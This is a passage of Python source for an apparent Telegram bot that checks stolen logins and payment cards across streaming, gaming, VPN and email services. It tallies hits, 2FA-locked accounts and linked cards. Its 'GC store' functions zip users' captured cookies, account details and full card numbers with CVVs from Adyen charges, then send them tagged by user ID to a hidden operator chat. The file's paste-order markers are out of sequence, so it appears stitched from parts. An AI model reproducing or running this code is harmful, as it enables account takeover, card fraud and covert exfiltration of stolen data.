        text = f"{E_STATS} <b>Netflix Stats</b>\n\n{SP_PREMIUM} Premium: <b>{p}</b>\n{SP_FREE} Free: <b>{f}</b>\n{SP_DEAD} Dead: <b>{d}</b>\n{SP_CODE} Tokens: <b>{tk}</b>"
    elif mode == "netflixcap":
        hit, free, bad, tfa, cus = (len(r["nfc_hit"]), len(r["nfc_free"]), len(r["nfc_bad"]),
                                     len(r["nfc_2fa"]), len(r["nfc_custom"]))
        text = (f"{E_STATS} <b>Netflix Cap Stats</b>\n\n{SP_PREMIUM} Hit: <b>{hit}</b>\n{SP_FREE} Free: <b>{free}</b>\n"
                f"{SS_DEAD} Bad: <b>{bad}</b>\n{MSFC_2FA} 2FA: <b>{tfa}</b>\n{CR_RETRY} Custom: <b>{cus}</b>")
    elif mode == "hbomax":
        live = len(r["hbo_live"]); dead = len(r["hbo_dead"]); t = r["hbo_total"]
        text = f"{E_STATS} <b>HBO Max Stats</b>\n\nChecked: <b>{t}</b>\n{HBO_LIVE} Live: <b>{live}</b>\n{HBO_DEAD} Dead: <b>{dead}</b>"
    elif mode == "hotmail":
        hits = len(r["hm_hits"]); dead = len(r["hm_dead"]); t = r["hm_total"]
        links = sum(len(x.get("linked_services", [])) for x in r["hm_hits"])
        text = f"{E_STATS} <b>Hotmail Stats</b>\n\nChecked: <b>{t}</b>\n{HM_HIT} Hits: <b>{hits}</b>\n{SS_DEAD} Dead: <b>{dead}</b>\n{HM_LINKED} Links: <b>{links}</b>"
    elif mode == "msfullcap":
        hits = len(r["msfc_hits"]); bad = len(r["msfc_bad"]); tfa = len(r["msfc_2fa"])
        with_card = sum(1 for x in r["msfc_hits"] if x.get("card_holder") and x.get("card_holder") != "No CC Linked")
        text = f"{E_STATS} <b>MS Full Cap Stats</b>\n\n{MSFC_HIT} Hits: <b>{hits}</b>\n{MSFC_CARD} With Card: <b>{with_card}</b>\n{SS_DEAD} Bad: <b>{bad}</b>\n{MSFC_2FA} 2FA: <b>{tfa}</b>"
    elif mode == "crunchyroll":
        hit, cus, fail, retry = (len(r["cr_hit"]), len(r["cr_custom"]), len(r["cr_fail"]), len(r["cr_retry"]))
        text = (f"{E_STATS} <b>Crunchyroll Stats</b>\n\n{CR_PREMIUM} Hits: <b>{hit}</b>\n{CR_RETRY} Custom: <b>{cus}</b>\n"
                f"{CR_FAIL} Fail: <b>{fail}</b>\n{SP_BOLT} Retry: <b>{retry}</b>")
    elif mode == "crunchyroll2":
        prem, free, valid, inv, mfa = (len(r["cr2_premium"]), len(r["cr2_free"]), len(r["cr2_valid"]),
                                       len(r["cr2_invalid"]), len(r["cr2_mfa"]))
        text = (f"{E_STATS} <b>Crunchyroll 2 Stats</b>\n\n{CR_PREMIUM} Premium: <b>{prem}</b>\n{CR_FREE} Free: <b>{free}</b>\n"
                f"{CR_PREMIUM} Valid: <b>{valid}</b>\n{CR_FAIL} Invalid: <b>{inv}</b>\n{MSFC_2FA} MFA: <b>{mfa}</b>")
    elif mode == "expressvpn":
        prem, free, dead, retry = (len(r["ex_premium"]), len(r["ex_free"]), len(r["ex_dead"]), len(r["ex_retry"]))
        text = (f"{E_STATS} <b>ExpressVPN Stats</b>\n\n{EX_PREMIUM} Premium: <b>{prem}</b>\n{EX_FREE} Free: <b>{free}</b>\n"
                f"{EX_DEAD} Dead: <b>{dead}</b>\n{SP_BOLT} Retry: <b>{retry}</b>")
    elif mode == "primevideo":
        paid, free, unk, dup, fail, err = (len(r["pv_paid"]), len(r["pv_free"]), len(r["pv_unknown"]),
                                           len(r["pv_duplicate"]), len(r["pv_failed"]), len(r["pv_error"]))
        text = (f"{E_STATS} <b>Prime Video Stats</b>\n\n"
                f"{PV_PAID} Paid: <b>{paid}</b>\n{PV_FREE} Free: <b>{free}</b>\n"
                f"{PV_UNKNOWN} Unknown: <b>{unk}</b>\n{PV_DUP} Dup: <b>{dup}</b>\n"
                f"{PV_FAIL} Failed: <b>{fail}</b>\n{PV_ERR} Error: <b>{err}</b>")
    elif mode == "xbox":
        prem, hit, free, noxbox = (len(r["xbox_premium"]), len(r["xbox_hit"]),
                                    len(r["xbox_free"]), len(r["xbox_noxbox"]))
        bad, locked, err = len(r["xbox_bad"]), len(r["xbox_locked"]), len(r["xbox_error"])
        text = (f"{E_STATS} <b>Xbox Auditor Stats</b>\n\n"
                f"{XB_PREMIUM} Premium: <b>{prem}</b>\n{XB_HIT} Hit: <b>{hit}</b>\n"
                f"{XB_FREE} Free: <b>{free}</b>\n{XB_NOXBOX} No Xbox: <b>{noxbox}</b>\n"
                f"{SS_DEAD} Bad: <b>{bad}</b>\n{MSFC_2FA} Locked: <b>{locked}</b>\n"
                f"❌ Error: <b>{err}</b>")
    elif mode == "xboxcap":
        hits, bad, tfa, err = (len(r["xboxcap_hits"]), len(r["xboxcap_bad"]),
                                len(r["xboxcap_2fa"]), len(r["xboxcap_error"]))
        text = (f"{E_STATS} <b>Xbox Full Capture Stats</b>\n\n"
                f"{XB_HIT} Hits: <b>{hits}</b>\n{SS_DEAD} Bad: <b>{bad}</b>\n"
                f"{MSFC_2FA} 2FA: <b>{tfa}</b>\n❌ Error: <b>{err}</b>")
    elif mode == "dazn":
        hits = len(r["dazn_hit"]); free = len(r["dazn_free"])
        bad  = len(r["dazn_bad"]);  retry = len(r["dazn_retry"])
        err  = len(r["dazn_error"]); total = r.get("dazn_total", 0)
        text = (f"{E_STATS} <b>DAZN Stats</b>\n\n"
                f"Checked: <b>{total}</b>\n{DZ_PREMIUM} Hits: <b>{hits}</b>\n"
                f"{DZ_FREE} Free: <b>{free}</b>\n{SS_DEAD} Bad: <b>{bad}</b>\n"
                f"{SP_BOLT} Retry: <b>{retry}</b>\n❌ Error: <b>{err}</b>")
    elif mode == "deezer":
        premium = len(r["deezer_premium"]); free = len(r["deezer_free"])
        bad     = len(r["deezer_bad"]);     retry = len(r["deezer_retry"])
        err     = len(r["deezer_error"]);   total = r.get("deezer_total", 0)
        text = (f"{E_STATS} <b>Deezer Stats</b>\n\n"
                f"Checked: <b>{total}</b>\n{DZR_PREMIUM} Premium: <b>{premium}</b>\n"
                f"{DZR_FREE} Free: <b>{free}</b>\n{SS_DEAD} Bad: <b>{bad}</b>\n"
                f"{SP_BOLT} Retry: <b>{retry}</b>\n❌ Error: <b>{err}</b>")
    elif mode == "disney":
        hits   = len(r["disney_hit"]);    free = len(r["disney_free"])
        bad    = len(r["disney_bad"]);    retry = len(r["disney_retry"])
        custom = len(r["disney_custom"]); err = len(r["disney_error"])
        total  = r.get("disney_total", 0)
        text = (f"{E_STATS} <b>Disney+ Stats</b>\n\n"
                f"Checked: <b>{total}</b>\n{DS_PREMIUM} Hits: <b>{hits}</b>\n"
                f"{DS_FREE} Free: <b>{free}</b>\n{SS_DEAD} Bad: <b>{bad}</b>\n"
                f"{SP_BOLT} Retry: <b>{retry}</b>\n{CR_RETRY} Custom: <b>{custom}</b>\n"
                f"❌ Error: <b>{err}</b>")
    elif mode == "roblox":
        hit  = len(r["roblox_hit"]);     prem   = len(r["roblox_premium"])
        free = len(r["roblox_free"]);    bad    = len(r["roblox_bad"])
        twofa = len(r["roblox_2fa"]);    locked = len(r["roblox_locked"])
        err  = len(r["roblox_error"]);   total  = r.get("roblox_total", 0)
        text = (f"{E_STATS} <b>Roblox Stats</b>\n\n"
                f"Checked: <b>{total}</b>\n{RB_HIT} Hit: <b>{hit}</b>\n"
                f"{RB_PREMIUM} Premium: <b>{prem}</b>\n{RB_FREE} Free: <b>{free}</b>\n"
                f"{SS_DEAD} Bad: <b>{bad}</b>\n{RB_2FA} 2FA: <b>{twofa}</b>\n"
                f"{RB_LOCKED} Locked: <b>{locked}</b>\n❌ Error: <b>{err}</b>")
    else:
        text = f"{E_EMPTY} No stats for {mode}."
    await bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=main_markup(mode))


# ▼ P7 END — PASTE P8 (runners + handle_file) AFTER THIS LINE ▼


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    GC STORE — 16 services, uid-tagged                   ║
# ║    Filenames: <service>_gc_uid_<id>_<ts>.zip                            ║
# ║    Inside ZIP: hits/<folder>/... + meta.txt (contains User ID)          ║
# ╚══════════════════════════════════════════════════════════════════════════╝

def _gc_user_tag(uid) -> str:
    try:
        return f"uid_{int(uid)}"
    except Exception:
        return "uid_unknown"


def _gc_build_zip(entries: list, meta: dict) -> io.BytesIO:
    """
    entries: list of {"content": str, "_folder": str, "_name": str}
    meta: extra dict for meta.txt
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for entry in entries:
            try:
                folder = entry.get("_folder", "").strip("/") or "misc"
                fname = entry.get("_name", "hit.txt") or "hit.txt"
                content = entry.get("content", "") or ""
                zf.writestr(f"{folder}/{fname}", content)
            except Exception:
                continue
        meta_lines = [f"{k}: {v}" for k, v in meta.items()]
        meta_lines.append(f"Generated: {datetime.now():%Y-%m-%d %H:%M:%S}")
        zf.writestr("meta.txt", "\n".join(meta_lines))
    buf.seek(0)
    return buf


def _gc_safe_slug(s: str, maxlen: int = 40) -> str:
    s = re.sub(r"[^\w\-.]", "_", str(s or "unk"))[:maxlen]
    return s or "unk"


# ── 1. Surfshark ─────────────────────────────────────────────────────────
async def _gc_store_ss(bot: Bot, premium: list, uid=0):
    if not GC_STORE_CHAT_ID or not premium:
        return
    try:
        entries = []
        for r_ in premium:
            plan_slug = _gc_safe_slug(r_.get("plan", "Unknown"))
            em = _gc_safe_slug(r_.get("email", "unk").split("@")[0])
            entries.append({
                "content": r_.get("content", ""),
                "_folder": f"premium/{plan_slug}",
                "_name":   f"{em}_{r_.get('expires_at','unk')}.txt",
            })
        meta = {
            "Service": "Surfshark",
            "User ID": uid,
            "Hits": len(premium),
            "Revived": sum(1 for x in premium if x.get("revived")),
        }
        buf = _gc_build_zip(entries, meta)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(
            GC_STORE_CHAT_ID,
            document=BufferedInputFile(buf.getvalue(), filename=f"ss_gc_{_gc_user_tag(uid)}_{ts}.zip"),
            caption=(f"{E_ZIP} <b>Surfshark GC</b>\n"
                     f"{E_ID} User: <code>{uid}</code>\n"
                     f"{SS_PREMIUM} Premium: <b>{len(premium)}</b>"),
            parse_mode="HTML")
    except Exception as e:
        logger.warning(f"GC ss error: {e}")


# ── 2. Spotify ───────────────────────────────────────────────────────────
async def _gc_store_sp(bot: Bot, premium: list, uid=0):
    if not GC_STORE_CHAT_ID or not premium:
        return
    try:
        entries = []
        for r_ in premium:
            nm = _gc_safe_slug(r_.get("filename", "cookie.txt"))
            entries.append({
                "content": r_.get("content", ""),
                "_folder": "premium",
                "_name":   nm,
            })
        meta = {"Service": "Spotify", "User ID": uid, "Hits": len(premium)}
        buf = _gc_build_zip(entries, meta)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(
            GC_STORE_CHAT_ID,
            document=BufferedInputFile(buf.getvalue(), filename=f"sp_gc_{_gc_user_tag(uid)}_{ts}.zip"),
            caption=(f"{E_ZIP} <b>Spotify GC</b>\n"
                     f"{E_ID} User: <code>{uid}</code>\n"
                     f"{SP_PREMIUM} Premium: <b>{len(premium)}</b>"),
            parse_mode="HTML", disable_notification=True)
    except Exception as e:
        logger.warning(f"GC sp error: {e}")


# ── 3. JioHotstar ────────────────────────────────────────────────────────
async def _gc_store_hs(bot: Bot, live, device, free, uid=0):
    if not GC_STORE_CHAT_ID or not (live or device or free):
        return
    try:
        entries = []
        for r_ in live:
            plan_slug = _gc_safe_slug(r_.get("plan", "Unknown"))
            entries.append({
                "content": hs_convert_to_netscape(r_.get("cookies", {})),
                "_folder": f"live/{plan_slug}",
                "_name":   f"{r_.get('name','unk')}_{r_.get('expiry','unk')}.txt",
            })
        for r_ in device:
            plan_slug = _gc_safe_slug(r_.get("plan", "Unknown"))
            entries.append({
                "content": hs_convert_to_netscape(r_.get("cookies", {})),
                "_folder": f"device_limit/{plan_slug}",
                "_name":   f"device_{r_.get('name','unk')}.txt",
            })
        for r_ in free:
            entries.append({
                "content": hs_convert_to_netscape(r_.get("cookies", {})),
                "_folder": "free",
                "_name":   f"free_{r_.get('name','unk')}.txt",
            })
        meta = {
            "Service": "JioHotstar", "User ID": uid,
            "Live": len(live), "Device Limit": len(device), "Free": len(free),
        }
        buf = _gc_build_zip(entries, meta)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(
            GC_STORE_CHAT_ID,
            document=BufferedInputFile(buf.getvalue(), filename=f"hs_gc_{_gc_user_tag(uid)}_{ts}.zip"),
            caption=(f"{E_ZIP} <b>Hotstar GC</b>\n"
                     f"{E_ID} User: <code>{uid}</code>\n"
                     f"{HS_LIVE} Live: <b>{len(live)}</b>  "
                     f"{HS_DEVICE} Device: <b>{len(device)}</b>  "
                     f"{HS_FREE} Free: <b>{len(free)}</b>"),
            parse_mode="HTML")
    except Exception as e:
        logger.warning(f"GC hs error: {e}")


# ── 4. Netflix (simple) — PREMIUM only ───────────────────────────────────
async def _gc_store_nf(bot: Bot, premium: list, uid=0):
    if not GC_STORE_CHAT_ID or not premium:
        return
    try:
        entries = []
        for idx, r_ in enumerate(premium, 1):
            plan_slug = _gc_safe_slug(r_.get("plan", "Unknown"))
            entries.append({
                "content": nf_build_export(r_, idx),
                "_folder": f"premium/{plan_slug}",
                "_name":   f"hit_{idx}_{_gc_safe_slug(r_.get('email','unk').split('@')[0])}.txt",
            })
        meta = {"Service": "Netflix", "User ID": uid, "Hits": len(premium)}
        buf = _gc_build_zip(entries, meta)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(
            GC_STORE_CHAT_ID,
            document=BufferedInputFile(buf.getvalue(), filename=f"nf_gc_{_gc_user_tag(uid)}_{ts}.zip"),
            caption=(f"{E_ZIP} <b>Netflix GC</b>\n"
                     f"{E_ID} User: <code>{uid}</code>\n"
                     f"{SP_PREMIUM} Premium: <b>{len(premium)}</b>"),
            parse_mode="HTML")
    except Exception as e:
        logger.warning(f"GC nf error: {e}")


# ── 5. Netflix Cap — HIT only ────────────────────────────────────────────
async def _gc_store_nfc(bot: Bot, hit: list, uid=0):
    if not GC_STORE_CHAT_ID or not hit:
        return
    try:
        entries = []
        for idx, r_ in enumerate(hit, 1):
            plan_slug = _gc_safe_slug(r_.get("plan", "Unknown"))
            entries.append({
                "content": r_.get("content", ""),
                "_folder": f"hit/{plan_slug}",
                "_name":   f"hit_{idx}.txt",
            })
        meta = {"Service": "Netflix Cap", "User ID": uid, "Hits": len(hit)}
        buf = _gc_build_zip(entries, meta)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(
            GC_STORE_CHAT_ID,
            document=BufferedInputFile(buf.getvalue(), filename=f"nfc_gc_{_gc_user_tag(uid)}_{ts}.zip"),
            caption=(f"{E_ZIP} <b>Netflix Cap GC</b>\n"
                     f"{E_ID} User: <code>{uid}</code>\n"
                     f"{SP_PREMIUM} Hit: <b>{len(hit)}</b>"),
            parse_mode="HTML")
    except Exception as e:
        logger.warning(f"GC nfc error: {e}")


# ── 6. HBO Max — LIVE only ───────────────────────────────────────────────
async def _gc_store_hbo(bot: Bot, live: list, uid=0):
    if not GC_STORE_CHAT_ID or not live:
        return
    try:
        entries = []
        for r_ in live:
            em = _gc_safe_slug(r_.get("email", "unk").split("@")[0])
            entries.append({
                "content": r_.get("content", ""),
                "_folder": f"live/{_gc_safe_slug(r_.get('region', 'unk'))}",
                "_name":   f"{em}.txt",
            })
        meta = {"Service": "HBO Max", "User ID": uid, "Live": len(live)}
        buf = _gc_build_zip(entries, meta)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(
            GC_STORE_CHAT_ID,
            document=BufferedInputFile(buf.getvalue(), filename=f"hbo_gc_{_gc_user_tag(uid)}_{ts}.zip"),
            caption=(f"{E_ZIP} <b>HBO Max GC</b>\n"
                     f"{E_ID} User: <code>{uid}</code>\n"
                     f"{HBO_LIVE} Live: <b>{len(live)}</b>"),
            parse_mode="HTML")
    except Exception as e:
        logger.warning(f"GC hbo error: {e}")


# ── 7. Hotmail — HIT only ────────────────────────────────────────────────
async def _gc_store_hm(bot: Bot, hits: list, uid=0):
    if not GC_STORE_CHAT_ID or not hits:
        return
    try:
        entries = []
        for idx, r_ in enumerate(hits, 1):
            linked_slug = _gc_safe_slug("_".join(r_.get("linked_services", [])), 60) or "no_links"
            entries.append({
                "content": r_.get("content", ""),
                "_folder": "hits",
                "_name":   f"hit_{idx}_{linked_slug}.txt",
            })
        meta = {
            "Service": "Hotmail", "User ID": uid,
            "Hits": len(hits),
            "Total Links": sum(len(x.get("linked_services", [])) for x in hits),
        }
        buf = _gc_build_zip(entries, meta)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(
            GC_STORE_CHAT_ID,
            document=BufferedInputFile(buf.getvalue(), filename=f"hm_gc_{_gc_user_tag(uid)}_{ts}.zip"),
            caption=(f"{E_ZIP} <b>Hotmail GC</b>\n"
                     f"{E_ID} User: <code>{uid}</code>\n"
                     f"{HM_HIT} Hits: <b>{len(hits)}</b>"),
            parse_mode="HTML")
    except Exception as e:
        logger.warning(f"GC hm error: {e}")


# ── 8. MS FullCap — HIT only ─────────────────────────────────────────────
async def _gc_store_msfc(bot: Bot, hits: list, uid=0):
    if not GC_STORE_CHAT_ID or not hits:
        return
    try:
        entries = []
        for idx, r_ in enumerate(hits, 1):
            entries.append({
                "content": r_.get("content", ""),
                "_folder": "hits",
                "_name":   f"hit_{idx}.txt",
            })
        meta = {
            "Service": "MS FullCap", "User ID": uid,
            "Hits": len(hits),
            "With Card": sum(1 for x in hits if x.get("card_holder") and x.get("card_holder") != "No CC Linked"),
        }
        buf = _gc_build_zip(entries, meta)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(
            GC_STORE_CHAT_ID,
            document=BufferedInputFile(buf.getvalue(), filename=f"msfc_gc_{_gc_user_tag(uid)}_{ts}.zip"),
            caption=(f"{E_ZIP} <b>MS FullCap GC</b>\n"
                     f"{E_ID} User: <code>{uid}</code>\n"
                     f"{MSFC_HIT} Hits: <b>{len(hits)}</b>"),
            parse_mode="HTML")
    except Exception as e:
        logger.warning(f"GC msfc error: {e}")


# ── 9. Crunchyroll — SUCCESS + CUSTOM ────────────────────────────────────
async def _gc_store_cr(bot: Bot, hit: list, custom: list, uid=0):
    if not GC_STORE_CHAT_ID or not (hit or custom):
        return
    try:
        entries = []
        for idx, r_ in enumerate(hit, 1):
            entries.append({
                "content": r_.get("content", ""),
                "_folder": "success",
                "_name":   f"hit_{idx}.txt",
            })
        for idx, r_ in enumerate(custom, 1):
            entries.append({
                "content": r_.get("content", ""),
                "_folder": "custom",
                "_name":   f"custom_{idx}.txt",
            })
        meta = {"Service": "Crunchyroll", "User ID": uid, "Success": len(hit), "Custom": len(custom)}
        buf = _gc_build_zip(entries, meta)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(
            GC_STORE_CHAT_ID,
            document=BufferedInputFile(buf.getvalue(), filename=f"cr_gc_{_gc_user_tag(uid)}_{ts}.zip"),
            caption=(f"{E_ZIP} <b>Crunchyroll GC</b>\n"
                     f"{E_ID} User: <code>{uid}</code>\n"
                     f"{CR_PREMIUM} Success: <b>{len(hit)}</b>  "
                     f"{CR_RETRY} Custom: <b>{len(custom)}</b>"),
            parse_mode="HTML")
    except Exception as e:
        logger.warning(f"GC cr error: {e}")


# ── 10. Crunchyroll 2 — PREMIUM + FREE + VALID ───────────────────────────
async def _gc_store_cr2(bot: Bot, premium: list, free: list, valid: list, uid=0):
    if not GC_STORE_CHAT_ID or not (premium or free or valid):
        return
    try:
        entries = []
        for bucket_name, bucket in [("premium", premium), ("free", free), ("valid", valid)]:
            for idx, r_ in enumerate(bucket, 1):
                entries.append({
                    "content": r_.get("content", ""),
                    "_folder": bucket_name,
                    "_name":   f"{bucket_name}_{idx}.txt",
                })
        meta = {
            "Service": "Crunchyroll 2", "User ID": uid,
            "Premium": len(premium), "Free": len(free), "Valid": len(valid),
        }
        buf = _gc_build_zip(entries, meta)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(
            GC_STORE_CHAT_ID,
            document=BufferedInputFile(buf.getvalue(), filename=f"cr2_gc_{_gc_user_tag(uid)}_{ts}.zip"),
            caption=(f"{E_ZIP} <b>Crunchyroll 2 GC</b>\n"
                     f"{E_ID} User: <code>{uid}</code>\n"
                     f"{CR_PREMIUM} Premium: <b>{len(premium)}</b>  "
                     f"{CR_FREE} Free: <b>{len(free)}</b>  "
                     f"{CR_PREMIUM} Valid: <b>{len(valid)}</b>"),
            parse_mode="HTML")
    except Exception as e:
        logger.warning(f"GC cr2 error: {e}")


# ── 11. ExpressVPN — PREMIUM only ────────────────────────────────────────
async def _gc_store_ex(bot: Bot, premium: list, uid=0):
    if not GC_STORE_CHAT_ID or not premium:
        return
    try:
        entries = []
        for idx, r_ in enumerate(premium, 1):
            plan_slug = _gc_safe_slug(str(r_.get("plan", "Unknown")))
            entries.append({
                "content": r_.get("content", ""),
                "_folder": f"premium/{plan_slug}",
                "_name":   f"premium_{idx}.txt",
            })
        meta = {"Service": "ExpressVPN", "User ID": uid, "Premium": len(premium)}
        buf = _gc_build_zip(entries, meta)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(
            GC_STORE_CHAT_ID,
            document=BufferedInputFile(buf.getvalue(), filename=f"ex_gc_{_gc_user_tag(uid)}_{ts}.zip"),
            caption=(f"{E_ZIP} <b>ExpressVPN GC</b>\n"
                     f"{E_ID} User: <code>{uid}</code>\n"
                     f"{EX_PREMIUM} Premium: <b>{len(premium)}</b>"),
            parse_mode="HTML")
    except Exception as e:
        logger.warning(f"GC ex error: {e}")


# ── 12. Prime Video — PAID only ──────────────────────────────────────────
async def _gc_store_pv(bot: Bot, paid: list, uid=0):
    if not GC_STORE_CHAT_ID or not paid:
        return
    try:
        entries = []
        for idx, r_ in enumerate(paid, 1):
            entries.append({
                "content": r_.get("content", ""),
                "_folder": f"paid/{_gc_safe_slug(r_.get('region', 'unk'))}",
                "_name":   f"paid_{idx}_{_gc_safe_slug(r_.get('email','unk').split('@')[0])}.txt",
            })
        meta = {"Service": "Prime Video", "User ID": uid, "Paid": len(paid)}
        buf = _gc_build_zip(entries, meta)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(
            GC_STORE_CHAT_ID,
            document=BufferedInputFile(buf.getvalue(), filename=f"pv_gc_{_gc_user_tag(uid)}_{ts}.zip"),
            caption=(f"{E_ZIP} <b>Prime Video GC</b>\n"
                     f"{E_ID} User: <code>{uid}</code>\n"
                     f"{PV_PAID} Paid: <b>{len(paid)}</b>"),
            parse_mode="HTML")
    except Exception as e:
        logger.warning(f"GC pv error: {e}")


# ── 13. Whop — SUCCESS only ──────────────────────────────────────────────
async def _gc_store_whop(bot: Bot, successes: list, uid=0):
    if not GC_STORE_CHAT_ID or not successes:
        return
    try:
        entries = []
        for idx, r_ in enumerate(successes, 1):
            content = (
                f"Card: ****{r_.get('card_last4','????')}\n"
                f"Email: {r_.get('email','?')}\n"
                f"Plan: {r_.get('plan_name','N/A')}\n"
                f"Plan ID: {r_.get('plan_id','N/A')}\n"
                f"Amount: {r_.get('amount','N/A')} {r_.get('currency','')}\n"
                f"Status: {r_.get('status','?')}\n"
                f"Message: {r_.get('message','')}\n"
            )
            entries.append({
                "content": content,
                "_folder": "success",
                "_name":   f"order_{idx}_{_gc_safe_slug(r_.get('card_last4','????'))}.txt",
            })
        meta = {"Service": "Whop", "User ID": uid, "Successful Orders": len(successes)}
        buf = _gc_build_zip(entries, meta)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(
            GC_STORE_CHAT_ID,
            document=BufferedInputFile(buf.getvalue(), filename=f"whop_gc_{_gc_user_tag(uid)}_{ts}.zip"),
            caption=(f"{E_ZIP} <b>Whop GC</b>\n"
                     f"{E_ID} User: <code>{uid}</code>\n"
                     f"{WH_OK} Successful: <b>{len(successes)}</b>"),
            parse_mode="HTML")
    except Exception as e:
        logger.warning(f"GC whop error: {e}")


# ── 14. Xbox Auditor — PREMIUM + HIT ─────────────────────────────────────
async def _gc_store_xbox(bot: Bot, premium: list, hit: list, uid=0):
    if not GC_STORE_CHAT_ID or not (premium or hit):
        return
    try:
        entries = []
        for bucket_name, bucket in [("premium", premium), ("hit", hit)]:
            for idx, r_ in enumerate(bucket, 1):
                entries.append({
                    "content": r_.get("content", ""),
                    "_folder": bucket_name,
                    "_name":   f"{bucket_name}_{idx}_{_gc_safe_slug(r_.get('gamertag','unk'))}.txt",
                })
        meta = {
            "Service": "Xbox", "User ID": uid,
            "Premium": len(premium), "Hit": len(hit),
        }
        buf = _gc_build_zip(entries, meta)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(
            GC_STORE_CHAT_ID,
            document=BufferedInputFile(buf.getvalue(), filename=f"xbox_gc_{_gc_user_tag(uid)}_{ts}.zip"),
            caption=(f"{E_ZIP} <b>Xbox GC</b>\n"
                     f"{E_ID} User: <code>{uid}</code>\n"
                     f"{XB_PREMIUM} Premium: <b>{len(premium)}</b>  "
                     f"{XB_HIT} Hit: <b>{len(hit)}</b>"),
            parse_mode="HTML")
    except Exception as e:
        logger.warning(f"GC xbox error: {e}")


# ── 15. Xbox Full Capture — HIT only ─────────────────────────────────────
async def _gc_store_xboxcap(bot: Bot, hits: list, uid=0):
    if not GC_STORE_CHAT_ID or not hits:
        return
    try:
        entries = []
        for idx, r_ in enumerate(hits, 1):
            content = r_.get("content", "")
            gp = r_.get("gamepass", "none")
            folder = "premium" if gp != "none" else "hit"
            entries.append({
                "content": content,
                "_folder": folder,
                "_name":   f"hit_{idx}_{_gc_safe_slug(r_.get('gamertag','unk'))}.txt",
            })
        meta = {
            "Service": "Xbox Full Capture", "User ID": uid,
            "Hits": len(hits),
            "With GamePass": sum(1 for x in hits if x.get("gamepass", "none") != "none"),
        }
        buf = _gc_build_zip(entries, meta)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(
            GC_STORE_CHAT_ID,
            document=BufferedInputFile(buf.getvalue(), filename=f"xboxcap_gc_{_gc_user_tag(uid)}_{ts}.zip"),
            caption=(f"{E_ZIP} <b>Xbox Full Capture GC</b>\n"
                     f"{E_ID} User: <code>{uid}</code>\n"
                     f"{XB_HIT} Hits: <b>{len(hits)}</b>"),
            parse_mode="HTML")
    except Exception as e:
        logger.warning(f"GC xboxcap error: {e}")


# ── 16. Adyen — Authorised only ──────────────────────────────────────────
async def _gc_store_ady(bot: Bot, authorised: list, uid=0):
    if not GC_STORE_CHAT_ID or not authorised:
        return
    try:
        entries = []
        for idx, r_ in enumerate(authorised, 1):
            card = r_.get("card", {}) or {}
            cc_full = f"{card.get('card','')}|{card.get('month','')}|{card.get('year','')}|{card.get('cvv','')}"
            content = (
                f"Card: {cc_full}\n"
                f"Merchant: {r_.get('merchant','N/A')}\n"
                f"Amount: {r_.get('amount','N/A')}\n"
                f"PSP: {r_.get('psp','N/A')}\n"
                f"Receipt: {r_.get('receipt_url','N/A')}\n"
                f"Time: {r_.get('response_time',0)}s\n"
            )
            entries.append({
                "content": content,
                "_folder": f"authorised/{_gc_safe_slug(r_.get('merchant','unk'))}",
                "_name":   f"ady_{idx}_{_gc_safe_slug(card.get('card','')[-4:])}.txt",
            })
        meta = {
            "Service": "Adyen", "User ID": uid,
            "Authorised": len(authorised),
        }
        buf = _gc_build_zip(entries, meta)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        await bot.send_document(
            GC_STORE_CHAT_ID,
            document=BufferedInputFile(buf.getvalue(), filename=f"ady_gc_{_gc_user_tag(uid)}_{ts}.zip"),
            caption=(f"{E_ZIP} <b>Adyen GC</b>\n"
                     f"{E_ID} User: <code>{uid}</code>\n"
                     f"{WH_OK} Authorised: <b>{len(authorised)}</b>"),
            parse_mode="HTML")
    except Exception as e:
        logger.warning(f"GC ady error: {e}")


# ▼ P6 END — PASTE P7 (state + keyboards + senders) AFTER THIS LINE ▼


# ═══════════════════════════════════════════════════════════════════════════
#  PER-SERVICE RUNNERS
# ═══════════════════════════════════════════════════════════════════════════

PROXY_MANAGER = ProxyManager()


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    DAZN / DEEZER / DISNEY+ / ROBLOX CONFIG              ║
# ╚══════════════════════════════════════════════════════════════════════════╝

import binascii

DAZN_COUNTRY_NAMES = {
    "US": "United States", "GB": "United Kingdom", "CA": "Canada", "AU": "Australia",
    "DE": "Germany", "FR": "France", "IT": "Italy", "ES": "Spain", "NL": "Netherlands",
    "BR": "Brazil", "MX": "Mexico", "JP": "Japan", "KR": "South Korea", "IN": "India",
    "SG": "Singapore", "SE": "Sweden", "NO": "Norway", "DK": "Denmark", "FI": "Finland",
    "AT": "Austria", "CH": "Switzerland", "BE": "Belgium", "IE": "Ireland", "NZ": "New Zealand",
    "ZA": "South Africa", "AR": "Argentina", "CL": "Chile", "CO": "Colombia", "PE": "Peru",
    "AE": "UAE", "SA": "Saudi Arabia", "TR": "Turkey", "PL": "Poland", "CZ": "Czech Republic",
    "HU": "Hungary", "RO": "Romania", "GR": "Greece", "PT": "Portugal", "IL": "Israel",
    "HK": "Hong Kong", "TW": "Taiwan", "TH": "Thailand", "MY": "Malaysia", "PH": "Philippines",
    "ID": "Indonesia", "VN": "Vietnam", "RU": "Russia", "UA": "Ukraine", "CN": "China",
}

